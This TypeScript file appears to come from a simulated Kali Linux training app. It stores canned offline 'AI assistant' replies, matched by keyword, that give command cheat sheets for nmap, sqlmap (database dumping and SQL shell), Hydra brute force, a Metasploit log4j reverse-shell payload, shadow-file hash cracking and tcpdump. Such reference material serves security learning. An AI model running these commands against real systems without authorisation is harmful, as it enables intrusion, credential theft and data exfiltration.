// OFFLINE MODE: This file contains highly technical, simulated AI responses
// for offline or local-only usage. It allows the terminal and AIAssistant to
// function completely WITHOUT an Internet connection.

interface OfflineTopic {
  keywords: string[];
  response: string;
}

const OFFLINE_TOPICS: OfflineTopic[] = [
  {
    keywords: ['nmap', 'port scan', 'scan port', 'recon'],
    response: `[OFFLINE MODE] 🛡️ Kali Local AI Database: NMAP RECONNAISSANCE GUIDE

Nmap (Network Mapper) is a free and open-source utility for network discovery and vulnerability scanning.

常用 NMAP 扫描命令 (Most Common Nmap Commands):
1. Basic Ping Scan (check live hosts):
   $ nmap -sn 192.168.1.0/24

2. SYN Stealth Scan (default, fast, requires root):
   $ sudo nmap -sS 192.168.1.105

3. Service Version & OS Detection with Default Scripts:
   $ nmap -sV -sC -O -T4 192.168.1.105

4. Scan All Ports (1-65535):
   $ nmap -p- 192.168.1.105

5. Vulnerability Scan using Nmap Scripting Engine (NSE):
   $ nmap --script vuln 192.168.1.105

Note: In a simulated environment, typing 'nmap' in the terminal directly runs an interactive scan reports against your loopback!`,
  },
  {
    keywords: ['sqlmap', 'sql injection', 'sqli', 'database exploit'],
    response: `[OFFLINE MODE] 🛡️ Kali Local AI Database: SQLMAP INJECTION GUIDE

Sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.

常用 SQLMAP 命令 (Common SQLMap Formats):
1. Test target URL parameter for vulnerability:
   $ sqlmap -u "http://target.com/vuln.php?id=1" --batch

2. Enumerate database names:
   $ sqlmap -u "http://target.com/vuln.php?id=1" --dbs

3. Get tables inside database 'users_db':
   $ sqlmap -u "http://target.com/vuln.php?id=1" -D users_db --tables

4. Dump columns and records from 'admin_table':
   $ sqlmap -u "http://target.com/vuln.php?id=1" -D users_db -T admin_table --dump

5. Spawn an interactive SQL shell on target server:
   $ sqlmap -u "http://target.com/vuln.php?id=1" --sql-shell`,
  },
  {
    keywords: ['hydra', 'brute force', 'ssh brute', 'ftp brute', 'crack pass'],
    response: `[OFFLINE MODE] 🛡️ Kali Local AI Database: HYDRA BRUTE-FORCE GUIDE

Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible.

常用 HYDRA 攻击指令 (Hydra Syntax Examples):
1. Attack SSH login using specific user and wordlist:
   $ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.105

2. Attack FTP with userlist and passwordlist:
   $ hydra -L users.txt -P passwords.txt ftp://192.168.1.105 -t 4

3. Attack SSH with 16 parallel threads, exit on first match (-f):
   $ hydra -l root -P rockyou.txt -t 16 -f ssh://192.168.1.105

⚠️ Ethics Warning: Brute-forcing should only be performed on authorized assets under agreement.`,
  },
  {
    keywords: ['metasploit', 'msf', 'exploit', 'msfconsole', 'payload', 'reverse shell'],
    response: `[OFFLINE MODE] 🛡️ Kali Local AI Database: METASPLOIT FRAMEWORK GUIDE

Metasploit is the world's most used penetration testing framework, aiding in vulnerability assessment and exploit execution.

常用命令 & 工作流 (Metasploit Core Workflow):
1. Start the Metasploit console:
   $ msfconsole

2. Search for vulnerabilities:
   msf6 > search apache log4j

3. Select and configure an exploit module:
   msf6 > use exploit/multi/http/log4j_header_injection
   msf6 > show options

4. Set target and payload:
   msf6 > set RHOSTS 192.168.1.105
   msf6 > set LHOST 192.168.1.200
   msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp

5. Launch the payload:
   msf6 > exploit`,
  },
  {
    keywords: ['john', 'hashcat', 'crack hash', 'md5', 'bcrypt', 'shadow'],
    response: `[OFFLINE MODE] 🛡️ Kali Local AI Database: HASH CRACKING GUIDE

John the Ripper and Hashcat are leading utilities for password hash auditing and offline cracking.

Hashcat Examples:
1. Crack MD5 hashes with rockyou wordlist:
   $ hashcat -m 0 hashes.txt rockyou.txt

2. Crack SHA-256 hashes:
   $ hashcat -m 1400 hashes.txt rockyou.txt

John the Ripper Examples:
1. Crack Linux shadow passwords:
   $ sudo unshadow /etc/passwd /etc/shadow > myhashes.txt
   $ john --wordlist=rockyou.txt myhashes.txt

2. Show cracked logins:
   $ john --show myhashes.txt`,
  },
  {
    keywords: ['git clone', 'github', 'clone', 'tools repo', 'git'],
    response: `[OFFLINE MODE] ℹ️ Git Repository System (Offline Info)

You are currently OFFLINE or simulating a disconnected environment. 

To download, clone, or install GitHub security tool repositories (like sqlmap, nmap, etc.):
1. Toggle "Internet: Connected" in the desktop taskbar.
2. Run your clone command again, e.g.:
   $ git clone https://github.com/sqlmapproject/sqlmap.git

Cloning is simulated by querying simulated internet endpoints and downloading tools directly into your Kali File Explorer (/home/kali/ folder), where you can navigate and execute them!`,
  },
  {
    keywords: ['wireshark', 'packet', 'sniff', 'tcpdump'],
    response: `[OFFLINE MODE] 🛡️ Kali Local AI Database: PACKET SNIFFING GUIDE

Wireshark and tcpdump capture and inspect local packets on networks.

tcpdump Examples:
1. Capture all packets on eth0 and print in hex:
   $ sudo tcpdump -i eth0 -XX

2. Filter for port 80 (HTTP) traffic only:
   $ sudo tcpdump -i eth0 port 80 -n

3. Write capture to a pcap file:
   $ sudo tcpdump -i eth0 -w dump.pcap`,
  },
];

export function getOfflineAIResponse(prompt: string): string {
  const normalizedPrompt = prompt.toLowerCase();

  // Try to find a matching topic
  for (const topic of OFFLINE_TOPICS) {
    if (topic.keywords.some(keyword => normalizedPrompt.includes(keyword))) {
      return topic.response;
    }
  }

  // Fallback smart response
  return `[OFFLINE MODE] 🖥️ Kali Local AI Agent (Disconnected from Cloud APIs)

I am currently running in OFFLINE/Local simulation mode. I can answer questions about Linux commands, networking, and cyber-security tools without an Internet connection!

Suggestions:
- Type 'ai nmap' or 'ai sqlmap' to learn how to scan targets.
- Type 'ai metasploit' to learn exploit setups.
- Type 'ai hydra' or 'ai john' to learn brute-forcing and hash cracking.

🔌 If you want real-time LLM answers (Google Gemini, OpenAI, Claude), make sure you:
1. Toggle the "Internet Mode" in the top-right taskbar to "Online".
2. Configure your API key in the ".env" file or in the desktop "AI Assistant" settings panel.

Happy hacking! 🐉`;
}
